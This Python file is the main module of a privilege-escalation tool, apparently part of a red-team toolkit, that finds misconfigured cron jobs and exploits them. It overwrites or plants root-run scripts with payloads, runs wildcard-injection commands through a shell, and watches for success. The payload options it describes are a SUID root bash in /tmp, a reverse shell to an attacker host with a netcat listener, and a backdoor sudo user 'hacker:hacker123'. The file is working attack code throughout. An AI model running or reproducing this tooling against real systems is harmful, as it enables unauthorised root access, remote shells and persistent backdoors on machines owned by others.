"""
Cron Job Exploitation Framework
===============================

Main orchestrator for cron job privilege escalation.
"""

import os
import json
import time
import shutil
from pathlib import Path
from datetime import datetime
from typing import List, Optional

from .cronjob import (
    CronJob, CronVulnerability, VulnerabilityType,
    ExploitResult, CronScanResult
)
from ..scanners.cron_scanner import CronScanner
from ..payloads.payload_generator import PayloadGenerator, PayloadType, Payload


class CronExploiter:
    """
    Main cron job exploitation framework.

    Discovers cron jobs and exploits misconfigurations for privilege escalation.

    Usage:
        exploiter = CronExploiter()
        results = exploiter.scan_and_exploit()
        exploiter.save_report(results)
    """

    BANNER = '''
    ╔═══════════════════════════════════════════════════════════════╗
    ║     Cron Job Exploitation Framework                           ║
    ║     Part of: 30 Days of Red Team Toolkit                      ║
    ║─────────────────────────────────────────────────────────────────║
    ║     "Patience is a virtue. Root is the reward."               ║
    ╚═══════════════════════════════════════════════════════════════╝
    '''

    # Marker files to detect execution
    MARKER_FILES = [
        '/tmp/.cron_pwned',
        '/tmp/rootbash',
        '/var/tmp/rootbash'
    ]

    def __init__(self, output_dir: Optional[str] = None, verbose: bool = False):
        """
        Initialize the exploiter.

        Args:
            output_dir: Directory for reports
            verbose: Enable verbose output
        """
        self.scanner = CronScanner()
        self.payload_gen = PayloadGenerator()
        self.verbose = verbose

        self.output_dir = Path(output_dir) if output_dir else Path("/tmp/cron_exploit")
        self.output_dir.mkdir(exist_ok=True, mode=0o755)

        print(self.BANNER)
        print(f"[+] Output directory: {self.output_dir}")

    def scan(self) -> CronScanResult:
        """
        Scan for cron jobs without exploitation.

        Returns:
            CronScanResult with findings
        """
        print(f"\n{'=' * 60}")
        print("CRON JOB ENUMERATION")
        print(f"{'=' * 60}")

        result = CronScanResult()

        # Scan for cron jobs
        all_jobs, vulnerabilities = self.scanner.scan_all()

        result.cron_jobs = all_jobs
        result.root_jobs = [j for j in all_jobs if j.runs_as_root]
        result.vulnerabilities = vulnerabilities

        # Print findings
        if vulnerabilities:
            print(f"\n[+] VULNERABILITIES FOUND:")

            for vuln in vulnerabilities:
                severity_color = "!!!" if vuln.severity == "CRITICAL" else "+"
                print(f"[{severity_color}] [{vuln.severity}] {vuln.vuln_type.value}")
                print(f"    Target: {vuln.target_path}")
                print(f"    {vuln.description}")
                print(f"    Exploit: {vuln.exploitation}")

        result.print_summary()

        return result

    def exploit(
            self,
            vulnerability: CronVulnerability,
            payload_type: PayloadType = PayloadType.SUID_BASH,
            lhost: Optional[str] = None,
            lport: Optional[int] = None,
            monitor: bool = True,
            timeout: int = 300
    ) -> ExploitResult:
        """
        Exploit a cron vulnerability.

        Args:
            vulnerability: The vulnerability to exploit
            payload_type: Type of payload to use
            lhost: Attacker IP for reverse shell
            lport: Attacker port for reverse shell
            monitor: Whether to monitor for execution
            timeout: Monitoring timeout in seconds

        Returns:
            ExploitResult
        """
        print(f"\n{'=' * 60}")
        print(f"EXPLOITING: {vulnerability.vuln_type.value}")
        print(f"{'=' * 60}")
        print(f"[*] Target: {vulnerability.target_path}")
        print(f"[*] Payload: {payload_type.value}")

        # Generate payload
        try:
            payload = self.payload_gen.generate(
                payload_type=payload_type,
                lhost=lhost,
                lport=lport
            )
        except ValueError as e:
            return ExploitResult(
                vulnerability=vulnerability,
                payload_type=payload_type.value,
                payload_written=False,
                error=str(e)
            )

        # Determine exploitation method based on vulnerability type
        if vulnerability.vuln_type in (VulnerabilityType.WRITABLE_SCRIPT,
                                       VulnerabilityType.WORLD_WRITABLE):
            result = self._exploit_writable_script(vulnerability, payload)

        elif vulnerability.vuln_type == VulnerabilityType.WRITABLE_DIRECTORY:
            result = self._exploit_writable_directory(vulnerability, payload)

        elif vulnerability.vuln_type == VulnerabilityType.MISSING_SCRIPT:
            result = self._exploit_missing_script(vulnerability, payload)

        elif vulnerability.vuln_type == VulnerabilityType.WILDCARD_INJECTION:
            result = self._exploit_wildcard(vulnerability, lhost, lport)

        else:
            return ExploitResult(
                vulnerability=vulnerability,
                payload_type=payload_type.value,
                payload_written=False,
                error=f"Unsupported vulnerability type: {vulnerability.vuln_type}"
            )

        # Monitor for execution if requested
        if result.payload_written and monitor:
            print(f"\n[*] Monitoring for execution...")
            print(f"[*] Payload: {payload.description}")
            print(f"[*] Post-exploitation: {payload.post_exploitation}")

            if payload_type == PayloadType.REVERSE_SHELL:
                print(f"\n[!] Set up listener: nc -lvnp {lport}")

            result.execution_confirmed = self._monitor_execution(timeout)

            if result.execution_confirmed:
                print(f"\n[+] EXPLOITATION SUCCESSFUL!")
                print(f"[+] {payload.post_exploitation}")

        return result

    def _exploit_writable_script(
            self,
            vulnerability: CronVulnerability,
            payload: Payload
    ) -> ExploitResult:
        """Exploit writable cron script"""
        target_path = vulnerability.target_path

        print(f"\n[*] Exploiting writable script: {target_path}")

        # Backup original
        backup_path = None

        try:
            backup_path = target_path + '.bak.' + datetime.now().strftime('%Y%m%d%H%M%S')
            shutil.copy2(target_path, backup_path)
            print(f"[+] Original backed up to: {backup_path}")
        except Exception as e:
            print(f"[!] Could not backup original: {e}")

        # Write payload
        try:
            with open(target_path, 'w') as f:
                f.write(payload.content)

            os.chmod(target_path, 0o755)

            print(f"[+] Payload written to: {target_path}")

            return ExploitResult(
                vulnerability=vulnerability,
                payload_type=payload.payload_type.value,
                payload_written=True,
                backup_path=backup_path
            )

        except Exception as e:
            print(f"[-] Failed to write payload: {e}")

            return ExploitResult(
                vulnerability=vulnerability,
                payload_type=payload.payload_type.value,
                payload_written=False,
                backup_path=backup_path,
                error=str(e)
            )

    def _exploit_writable_directory(
            self,
            vulnerability: CronVulnerability,
            payload: Payload
    ) -> ExploitResult:
        """Exploit writable directory containing cron script"""
        target_dir = vulnerability.target_path
        script_path = vulnerability.cron_job.script_path

        if script_path:
            target_path = script_path
        else:
            target_path = os.path.join(target_dir, 'malicious.sh')

        print(f"\n[*] Exploiting writable directory: {target_dir}")
        print(f"[*] Creating/replacing script: {target_path}")

        # Backup if exists
        backup_path = None

        if os.path.exists(target_path):
            try:
                backup_path = target_path + '.bak.' + datetime.now().strftime('%Y%m%d%H%M%S')
                shutil.copy2(target_path, backup_path)
                print(f"[+] Original backed up to: {backup_path}")
            except:
                pass

        # Write payload
        try:
            with open(target_path, 'w') as f:
                f.write(payload.content)

            os.chmod(target_path, 0o755)

            print(f"[+] Payload written to: {target_path}")

            return ExploitResult(
                vulnerability=vulnerability,
                payload_type=payload.payload_type.value,
                payload_written=True,
                backup_path=backup_path
            )

        except Exception as e:
            print(f"[-] Failed to write payload: {e}")

            return ExploitResult(
                vulnerability=vulnerability,
                payload_type=payload.payload_type.value,
                payload_written=False,
                error=str(e)
            )

    def _exploit_missing_script(
            self,
            vulnerability: CronVulnerability,
            payload: Payload
    ) -> ExploitResult:
        """Create missing script that cron expects"""
        target_path = vulnerability.target_path

        print(f"\n[*] Creating missing script: {target_path}")

        try:
            # Ensure parent directory exists
            parent_dir = os.path.dirname(target_path)

            if not os.path.exists(parent_dir):
                print(f"[-] Parent directory doesn't exist: {parent_dir}")

                return ExploitResult(
                    vulnerability=vulnerability,
                    payload_type=payload.payload_type.value,
                    payload_written=False,
                    error="Parent directory doesn't exist"
                )

            # Create script
            with open(target_path, 'w') as f:
                f.write(payload.content)

            os.chmod(target_path, 0o755)

            print(f"[+] Script created: {target_path}")

            return ExploitResult(
                vulnerability=vulnerability,
                payload_type=payload.payload_type.value,
                payload_written=True
            )

        except Exception as e:
            print(f"[-] Failed to create script: {e}")

            return ExploitResult(
                vulnerability=vulnerability,
                payload_type=payload.payload_type.value,
                payload_written=False,
                error=str(e)
            )

    def _exploit_wildcard(
            self,
            vulnerability: CronVulnerability,
            lhost: Optional[str],
            lport: Optional[int]
    ) -> ExploitResult:
        """Exploit wildcard injection vulnerability"""
        command = vulnerability.cron_job.command.lower()

        # Determine which binary
        binary = None
        for b in ['tar', 'rsync', 'chown', 'chmod']:
            if b in command:
                binary = b
                break

        if not binary:
            return ExploitResult(
                vulnerability=vulnerability,
                payload_type="wildcard_injection",
                payload_written=False,
                error="Could not determine vulnerable binary"
            )

        # Find target directory (where wildcards expand)
        target_dir = vulnerability.cron_job.script_path

        if not target_dir:
            # Try to extract from command
            parts = vulnerability.cron_job.command.split()
            for part in parts:
                if '*' in part:
                    target_dir = os.path.dirname(part.replace('*', ''))
                    break

        if not target_dir or not os.access(target_dir, os.W_OK):
            return ExploitResult(
                vulnerability=vulnerability,
                payload_type="wildcard_injection",
                payload_written=False,
                error=f"Cannot write to target directory: {target_dir}"
            )

        print(f"\n[*] Wildcard injection for {binary}")
        print(f"[*] Target directory: {target_dir}")

        # Generate injection commands
        injection = self.payload_gen.generate_wildcard_injection(
            binary=binary,
            target_dir=target_dir,
            lhost=lhost,
            lport=lport
        )

        print(f"\n[*] Run these commands:")
        print(injection)

        # Try to create the files
        try:
            import subprocess
            result = subprocess.run(
                injection,
                shell=True,
                capture_output=True,
                text=True,
                cwd=target_dir
            )

            if result.returncode == 0:
                print(f"[+] Injection files created")

                return ExploitResult(
                    vulnerability=vulnerability,
                    payload_type="wildcard_injection",
                    payload_written=True
                )
        except:
            pass

        return ExploitResult(
            vulnerability=vulnerability,
            payload_type="wildcard_injection",
            payload_written=False,
            error="Manual injection required - see commands above"
        )

    def _monitor_execution(self, timeout: int = 300) -> bool:
        """Monitor for successful exploitation"""
        print(f"\n[*] Monitoring for {timeout} seconds...")
        print(f"[*] Looking for marker files...")

        start_time = time.time()
        check_interval = 5

        while time.time() - start_time < timeout:
            elapsed = int(time.time() - start_time)

            # Check for marker files
            for marker in self.MARKER_FILES:
                if os.path.exists(marker):
                    print(f"\n[+] Marker found: {marker}")

                    if 'rootbash' in marker:
                        print(f"[+] SUID bash created!")
                        print(f"[+] Run: {marker} -p")

                    return True

            # Progress indicator
            if elapsed % 30 == 0 and elapsed > 0:
                print(f"[*] Still waiting... ({elapsed}s / {timeout}s)")

            time.sleep(check_interval)

        print(f"\n[-] Timeout reached after {timeout}s")
        print(f"[*] Cron job may not have executed yet")
        print(f"[*] Check cron schedule and try again")

        return False

    def scan_and_exploit(
            self,
            payload_type: PayloadType = PayloadType.SUID_BASH,
            lhost: Optional[str] = None,
            lport: Optional[int] = None,
            monitor: bool = True
    ) -> CronScanResult:
        """
        Scan for cron jobs and exploit vulnerabilities.

        Args:
            payload_type: Type of payload to use
            lhost: Attacker IP for reverse shell
            lport: Attacker port for reverse shell
            monitor: Whether to monitor for execution

        Returns:
            CronScanResult with exploitation results
        """
        print(f"\n{'=' * 60}")
        print("AUTOMATED CRON EXPLOITATION")
        print(f"{'=' * 60}")

        # Scan first
        result = self.scan()

        if not result.vulnerabilities:
            print(f"\n[-] No exploitable cron vulnerabilities found")
            return result

        # Prioritize vulnerabilities
        # CRITICAL first, then writable scripts, then others
        sorted_vulns = sorted(
            result.vulnerabilities,
            key=lambda v: (
                v.severity != "CRITICAL",
                v.vuln_type != VulnerabilityType.WRITABLE_SCRIPT,
                v.vuln_type != VulnerabilityType.MISSING_SCRIPT
            )
        )

        # Exploitation phase
        print(f"\n{'=' * 60}")
        print("EXPLOITATION PHASE")
        print(f"{'=' * 60}")

        for vuln in sorted_vulns:
            # Skip wildcard injection if no reverse shell params
            if vuln.vuln_type == VulnerabilityType.WILDCARD_INJECTION:
                if not (lhost and lport):
                    print(f"\n[*] Skipping wildcard injection (no LHOST/LPORT)")
                    continue

            exploit_result = self.exploit(
                vulnerability=vuln,
                payload_type=payload_type,
                lhost=lhost,
                lport=lport,
                monitor=monitor
            )

            result.exploit_results.append(exploit_result)

            if exploit_result.execution_confirmed:
                print(f"\n[+] EXPLOITATION SUCCESSFUL!")
                break

        return result

    def save_report(self, result: CronScanResult, filename: str = "cron_report.json") -> Path:
        """Save scan results to JSON"""
        report_path = self.output_dir / filename

        with open(report_path, 'w') as f:
            json.dump(result.to_dict(), f, indent=2)

        print(f"\n[+] Report saved: {report_path}")

        return report_path

    def generate_exploit_guide(self, result: CronScanResult) -> Path:
        """Generate quick exploitation guide"""
        guide_path = self.output_dir / "exploit_guide.txt"

        with open(guide_path, 'w') as f:
            f.write("CRON JOB EXPLOITATION GUIDE\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")

            if result.vulnerabilities:
                f.write("VULNERABILITIES\n")
                f.write("-" * 60 + "\n\n")

                for vuln in result.vulnerabilities:
                    f.write(f"[{vuln.severity}] {vuln.vuln_type.value}\n")
                    f.write(f"Target: {vuln.target_path}\n")
                    f.write(f"Description: {vuln.description}\n")
                    f.write(f"Exploitation: {vuln.exploitation}\n")
                    f.write(f"Schedule: {vuln.cron_job.schedule}\n\n")

            f.write("\nPAYLOAD OPTIONS\n")
            f.write("-" * 60 + "\n\n")
            f.write("1. SUID Bash (default):\n")
            f.write("   Creates /tmp/rootbash - run with: /tmp/rootbash -p\n\n")
            f.write("2. Reverse Shell:\n")
            f.write("   Set up listener: nc -lvnp PORT\n\n")
            f.write("3. Add User:\n")
            f.write("   Creates hacker:hacker123 with sudo\n\n")

        print(f"[+] Exploit guide saved: {guide_path}")

        return guide_path

    def list_payloads(self) -> None:
        """List available payload types"""
        self.payload_gen.list_payloads()